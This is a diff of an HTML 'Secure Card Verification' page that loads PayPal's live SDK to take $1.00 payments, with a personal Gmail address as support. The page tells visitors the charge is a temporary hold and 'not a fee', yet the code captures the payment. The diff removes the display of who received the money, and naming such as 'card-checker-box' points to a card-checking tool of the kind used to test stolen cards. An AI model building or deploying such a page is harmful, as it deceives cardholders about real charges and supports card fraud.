@@ -5,97 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Card Verification</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #f8f9fa; }
-        .payment-card {
-            max-width: 500px;
-            margin: 50px auto;
+        body {
+            background-color: #f8f9fa;
+            padding-top: 50px;
+        }
+        .card-checker-box {
             background: white;
             padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: auto;
         }
-        .verified-badge {
-            color: #198754;
+        .status-badge {
+            font-size: 0.9em;
+            padding: 8px 15px;
+            border-radius: 20px;
             display: none;
-            text-align: center;
-            margin-top: 20px;
+            margin-top: 15px;
         }
-        .spinner-border { display: none; }
+        .verified { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .declined { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .spinner { display: none; margin-right: 10px; }
+        .txn-id { font-family: monospace; font-weight: bold; color: #333; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="payment-card">
-        <h3 class="text-center mb-4">Card Verification</h3>
-        
-        <!-- Step 1: Card Input Form -->
-        <div id="cardFormSection">
-            <form id="paymentForm" onsubmit="handleFormSubmit(event)">
-                <div class="mb-3">
-                    <label class="form-label">Card Number</label>
-                    <div class="input-group">
-                        <span class="input-group-text"><i class="bi bi-credit-card"></i></span>
-                        <input type="text" class="form-control" placeholder="xxxx xxxx xxxx xxxx" required maxlength="19">
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="col-md-6 mb-3">
-                        <label class="form-label">Expiry Date</label>
-                        <input type="text" class="form-control" placeholder="MM/YY" required maxlength="5">
-                    </div>
-                    <div class="col-md-6 mb-3">
-                        <label class="form-label">CVV</label>
-                        <input type="password" class="form-control" placeholder="xxx" required maxlength="4">
-                    </div>
-                </div>
-                <div class="mb-3">
-                    <label class="form-label">Cardholder Name</label>
-                    <input type="text" class="form-control" placeholder="" required>
-                </div>
-                <button type="submit" class="btn btn-primary w-100 btn-lg">
-                    Verify Card Now
-                </button>
-            </form>
-        </div>
+    <div class="card-checker-box">
+        <h3 class="text-center mb-4"><i class="fas fa-shield-alt text-primary"></i> Card Verification</h3>
+        <p class="text-muted text-center mb-4">
+            A temporary $1.00 USD hold will be placed to verify your card is active. This is not a fee.
+        </p>
 
-        <!-- Step 2: Payment Section (Hidden initially) -->
-        <div id="paymentSection" style="display: none;">
-            <div class="alert alert-info">
-                <i class="bi bi-info-circle"></i> <strong>Verification Required</strong><br>
-                A $1.00 security charge is required. Click the black button below to pay with Card.
-            </div>
-
-            <!-- PayPal Smart Buttons Container -->
+        <!-- Payment Section -->
+        <div id="paymentSection">
+            <!-- PayPal Button Container -->
             <div id="paypal-button-container"></div>
-            
-            <p id="result-message" class="text-center mt-3"></p>
-
-            <button onclick="goBack()" class="btn btn-link btn-sm mt-2 text-muted">Use a different card</button>
-
-            <hr>
-            <p class="small text-muted text-center">
-                Secure Payment by PayPal<br>
-                Support: <a href="mailto:muhammadmuba191@gmail.com">muhammadmuba191@gmail.com</a>
-            </p>
         </div>
 
-        <div class="verified-badge" id="successMsg">
-            <h4><i class="bi bi-check-circle-fill"></i> Verified!</h4>
-            <p>Payment detected. Your card is active.</p>
-            <small class="text-muted">Transaction ID: <span id="txnId"></span></small><br>
-            <small class="text-danger"><strong>Money Sent To: <span id="payeeEmail"></span></strong></small>
+        <!-- Success Message -->
+        <div id="successMsg" class="status-badge verified text-center">
+            <i class="fas fa-check-circle"></i> <strong>Verified!</strong><br>
+            Payment detected. Your card is active.<br>
+            Transaction ID: <span id="txnId" class="txn-id"></span>
         </div>
+
+        <!-- Error Message -->
+        <div id="errorMsg" class="status-badge declined text-center">
+            <i class="fas fa-times-circle"></i> <strong>Verification Failed</strong><br>
+            <span id="errorText">Card declined or bank rejected the transaction.</span>
+        </div>
+        
+        <p class="small text-muted text-center mt-4">
+            Secure Payment by PayPal<br>
+            Support: <a href="mailto:muhammadmuba191@gmail.com">muhammadmuba191@gmail.com</a>
+        </p>
     </div>
 </div>
 
 <!-- Load PayPal JS SDK (LIVE Mode) -->
-<!-- We enable 'funding=card' to show the Credit Card button explicitly -->
+<!-- Client ID: AVAClJWOIDV0TxJ4Mj1ojCbqftbO8VrVRjC3pk3cliNH-hrpqOXHzIIsPWGfSBW8mRbDfRJVZd_Am-oQ -->
 <script src="https://www.paypal.com/sdk/js?client-id=AVAClJWOIDV0TxJ4Mj1ojCbqftbO8VrVRjC3pk3cliNH-hrpqOXHzIIsPWGfSBW8mRbDfRJVZd_Am-oQ&currency=USD&enable-funding=card"></script>
 
 <script>
-    // Render the PayPal Smart Buttons
     paypal.Buttons({
         // Set up the transaction
         createOrder: function(data, actions) {
@@ -110,59 +86,31 @@
         // Finalize the transaction
         onApprove: function(data, actions) {
             return actions.order.capture().then(function(details) {
-                // REAL SUCCESS: Only runs if PayPal actually charged the card
-                console.log('Capture result', details, JSON.stringify(details, null, 2));
+                console.log('Capture result', details);
                 
+                // Only show success if status is COMPLETED
                 if (details.status === 'COMPLETED') {
                     document.getElementById('paymentSection').style.display = 'none';
                     document.getElementById('txnId').innerText = details.id;
-
-                    // Show who received the money (to help user find it)
-                    var payeeInfo = "Unknown";
-                    if (details.purchase_units && details.purchase_units[0] && details.purchase_units[0].payee) {
-                        var payee = details.purchase_units[0].payee;
-                        if (payee.email_address) {
-                            payeeInfo = payee.email_address;
-                        } else if (payee.merchant_id) {
-                            payeeInfo = "Merchant ID: " + payee.merchant_id;
-                        }
-                    }
-                    // document.getElementById('payeeEmail').innerText = payeeInfo; // Hidden for production
-                    
-                    // ALERT the info to make sure user sees it
-                    // alert("Payment Complete!\nTransaction ID: " + details.id + "\nMoney sent to: " + payeeInfo);
-                    
                     document.getElementById('successMsg').style.display = 'block';
+                    document.getElementById('errorMsg').style.display = 'none';
                 } else {
-                    alert("Payment not completed. Status: " + details.status);
+                    document.getElementById('errorText').innerText = "Status: " + details.status;
+                    document.getElementById('errorMsg').style.display = 'block';
                 }
             }).catch(function(err) {
-                // Show specific error if capture fails
-                alert("Payment Failed: Card Declined or Error. " + err);
                 console.error(err);
+                document.getElementById('errorText').innerText = "Process error: " + err;
+                document.getElementById('errorMsg').style.display = 'block';
             });
         },
         onError: function (err) {
-            // Show error to user
-            alert("PayPal Error: " + err);
-            console.error(err);
+            console.error('PayPal Error:', err);
+            document.getElementById('errorText').innerText = "Could not load payment window. " + err;
+            document.getElementById('errorMsg').style.display = 'block';
         }
     }).render('#paypal-button-container');
 </script>
 
-<script>
-function handleFormSubmit(event) {
-    event.preventDefault(); // Stop form from refreshing page
-    
-    // Hide Form, Show Payment Section
-    document.getElementById('cardFormSection').style.display = 'none';
-    document.getElementById('paymentSection').style.display = 'block';
-}
-
-function goBack() {
-    document.getElementById('cardFormSection').style.display = 'block';
-    document.getElementById('paymentSection').style.display = 'none';
-}
-</script>
 </body>
 </html>
